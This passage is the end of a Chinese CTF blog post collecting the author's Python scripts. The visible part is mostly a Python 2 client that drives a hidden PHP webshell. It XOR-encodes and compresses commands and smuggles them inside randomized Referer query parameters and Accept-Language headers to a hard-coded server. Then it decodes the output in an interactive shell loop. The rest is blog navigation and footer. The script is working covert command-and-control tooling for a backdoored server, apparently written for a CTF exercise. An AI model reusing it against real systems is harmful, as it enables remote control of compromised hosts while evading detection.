class="number">0</span>,length<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span><span class="params">(amount)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += chr(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span><span class="params">(amount)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    lenKey = len(key)</span><br><span class="line">    lenTxt = len(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">"42f7"</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">"e9ac"</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">'http://111.198.29.45:44036/hack.php'</span></span><br><span class="line">defaultLang = <span class="string">'zh-CN'</span></span><br><span class="line">languages = [<span class="string">'zh-TW;q=0.%d'</span>,<span class="string">'zh-HK;q=0.%d'</span>,<span class="string">'en-US;q=0.%d'</span>,<span class="string">'en;q=0.%d'</span>]</span><br><span class="line">proxies = <span class="literal">None</span> <span class="comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = sorted(choicePart(range(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">','</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">'$i is %s'</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">'md5 head: %s'</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">'md5 tail: %s'</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">''</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(max(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">'Before insert payload:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,len(payload)<span class="number">-3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">'?'</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">'After insert payload, referer is:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">'Accept-Language'</span>:acceptLangStr,<span class="string">'Referer'</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.compile(<span class="string">r'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> len(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error,  no backdoor response'</span></span><br><span class="line">        cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">'base64'</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br></pre></td></tr></table></figure>
        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2019-12-22T09:51:57.385Z" itemprop="dateUpdated">2019-12-22 17:51:57</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/一些我常用的py脚本/" target="_blank" rel="external">https://www.damyahome.github.io/一些我常用的py脚本/</a>
        
    </div>
    <footer>
        <a href="https://www.damyahome.github.io">
            <img src="/img/avatar.jpg" alt="Damya">
            Damya
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/一些我常用的py脚本/&title=《一些我常用的py脚本》 — 远花火&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/一些我常用的py脚本/&title=《一些我常用的py脚本》 — 远花火&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/ISCC-misc-web-wp/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">ISCC misc+web wp</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/一些和sql注入有关的web题wp/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">一些和sql注入有关的web题wp</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批处理修改文件后缀名-当前目录下"><span class="post-toc-number">1.</span> <span class="post-toc-text">批处理修改文件后缀名(当前目录下)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#进制转换解码脚本"><span class="post-toc-number">2.</span> <span class="post-toc-text">进制转换解码脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ascil码转字符串或解base64"><span class="post-toc-number">3.</span> <span class="post-toc-text">ascil码转字符串或解base64</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#完整base64解码-txt输入输出"><span class="post-toc-number">4.</span> <span class="post-toc-text">完整base64解码(txt输入输出)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批量crc32碰撞"><span class="post-toc-number">5.</span> <span class="post-toc-text">批量crc32碰撞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批量图片爬取-百度"><span class="post-toc-number">6.</span> <span class="post-toc-text">批量图片爬取(百度)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#统计字符频率"><span class="post-toc-number">7.</span> <span class="post-toc-text">统计字符频率</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#将十六进制错位转ascil输出"><span class="post-toc-number">8.</span> <span class="post-toc-text">将十六进制错位转ascil输出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解摩斯密码"><span class="post-toc-number">9.</span> <span class="post-toc-text">解摩斯密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批量替换txt里字符"><span class="post-toc-number">10.</span> <span class="post-toc-text">批量替换txt里字符</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web源码泄露探测"><span class="post-toc-number">11.</span> <span class="post-toc-text">web源码泄露探测</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#模拟自动刷新脚本"><span class="post-toc-number">12.</span> <span class="post-toc-text">模拟自动刷新脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#培根密码解密脚本"><span class="post-toc-number">13.</span> <span class="post-toc-text">培根密码解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RSA解密模板脚本"><span class="post-toc-number">14.</span> <span class="post-toc-text">RSA解密模板脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#敲击码转换脚本"><span class="post-toc-number">15.</span> <span class="post-toc-text">敲击码转换脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web条件竞争脚本"><span class="post-toc-number">16.</span> <span class="post-toc-text">web条件竞争脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文字识别脚本"><span class="post-toc-number">17.</span> <span class="post-toc-text">文字识别脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解base64图片-PHP脚本"><span class="post-toc-number">18.</span> <span class="post-toc-text">解base64图片(PHP脚本)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#四方解密脚本"><span class="post-toc-number">19.</span> <span class="post-toc-text">四方解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#连续解压压缩包脚本"><span class="post-toc-number">20.</span> <span class="post-toc-text">连续解压压缩包脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#将javascript处理后的编码还原成QR图片脚本"><span class="post-toc-number">21.</span> <span class="post-toc-text">将javascript处理后的编码还原成QR图片脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#base64隐写解密脚本"><span class="post-toc-number">22.</span> <span class="post-toc-text">base64隐写解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#奇怪的TTL密码脚本-63-127-191-255"><span class="post-toc-number">23.</span> <span class="post-toc-text">奇怪的TTL密码脚本(63 127 191 255)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PDF爆破hash密码"><span class="post-toc-number">24.</span> <span class="post-toc-text">PDF爆破hash密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flask模板注入"><span class="post-toc-number">25.</span> <span class="post-toc-text">flask模板注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#base家族解密脚本-85-16-32-64"><span class="post-toc-number">26.</span> <span class="post-toc-text">base家族解密脚本(85\16\32\64)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#base64隐写脚本"><span class="post-toc-number">27.</span> <span class="post-toc-text">base64隐写脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注脚本"><span class="post-toc-number">28.</span> <span class="post-toc-text">盲注脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#php混淆攻击脚本"><span class="post-toc-number">29.</span> <span class="post-toc-text">php混淆攻击脚本</span></a></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        让这个世界的bug有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.virzz.com/" target="_blank">Virink</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Damya &copy; 2017 - 2020
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/一些我常用的py脚本/&title=《一些我常用的py脚本》 — 远花火&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/一些我常用的py脚本/&title=《一些我常用的py脚本》 — 远花火&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3aS47CQAxFUfa/6fSUAZj77NASrpsR4lOpk5bcdtmPB76up4u88/z+u9Xeva5/O7pkyJDxs4yrvOpN1wDyKw778JhkyJBxAGMSFuvtpmum68iQIUPGJCCmCWV9LxkyZMjoMeoV7iqVZciQIYMHSn7QNtnQ12txGTJk/CCDh8L/f/2V/oYMGTJ+inGF1128SZB9sSsZMmSsZvAAlyZnaXKZlsQyZMg4h9ELhaQonYyIxcd5MmTIWM1Ib99LHNMUc9LalCFDxj4GT8LqzaWf9gYvUGooQ4aMdQxSUnIMCZokpKappAwZMk5g8ISMAOojfoKsV0YFrQwZMtYxemNhvTI1HeoiD1SGDBknMPgZe6+45UnkvW1UGTJkbGKkG+2NU0xam6h8lSFDxlJGWnzecBDWGqFAua0MGTKWMno3aE5zDBoMKVuGDBlbGcFYw+QJ4RZmc2UZMmSsY0yKzDT48pI4HhSTIUPGagYPtWkiyA/UeCgP/iYyZMhYzUhHsibtgUmARmeHMmTIWMcggY+kknwIIw3QKDWUIUPGasa8MUDCZa85ih6HDBkyljKu8JqE6bRYDYpnGTJkrGbM2429gnaSjKappAwZMnYwSJBN0770m+l3UOYoQ4aMdQwe+PgjqNPK3n+A5rCFDBkyjmSkQbOXFH494MqQIeMAxrwNkLYEPhSxMmTIWM0gN+6d1fEBr3QPMmTIOIeRbqVXmvZW4K9lyJCxlPEH4AMsulxzpPAAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '等你回来呀~';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)欢迎回来!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
